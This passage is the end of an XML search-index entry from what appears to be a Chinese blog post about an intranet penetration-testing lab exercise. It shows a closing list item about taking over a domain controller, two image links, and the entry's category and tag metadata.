<li>域控上线</li>
</ul>
<p><img data-src="./ack123/75.png" alt></p>
<p><img data-src="./ack123/76.png" alt></p>
]]></content>
      <categories>
        <category>内网靶场</category>
        <category>moonsec</category>
      </categories>
      <tags>
        <tag>内网渗透测试</tag>
        <tag>单兵能力</tag>
      </tags>
  </entry>
</search>
